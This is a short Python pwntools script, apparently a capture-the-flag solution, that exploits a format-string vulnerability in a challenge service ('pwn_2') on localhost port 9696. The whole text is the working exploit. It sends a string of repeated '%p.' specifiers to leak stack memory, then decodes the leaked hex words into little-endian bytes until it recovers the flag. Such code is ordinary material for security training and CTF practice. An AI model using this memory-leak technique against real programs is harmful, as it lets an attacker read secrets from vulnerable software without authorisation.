from pwn import *
import math

ip = "localhost"
port = 9696

payload = b"%p."*(50//3)

p = remote(ip, port)
#p = process("./pwn_2")
p.send(payload+b"\n")
data = p.recv()
data = data.split(b"\n")[-1].split(b".")[5:]

flag = b""
for i in data:
    if i != b"":
        flag += int(i, 16).to_bytes(math.ceil((len(i)-2)/2), 'little')
    if b"}" in flag:
        print(f"Flag : {flag}")
        p.close()
        exit()
p.close()
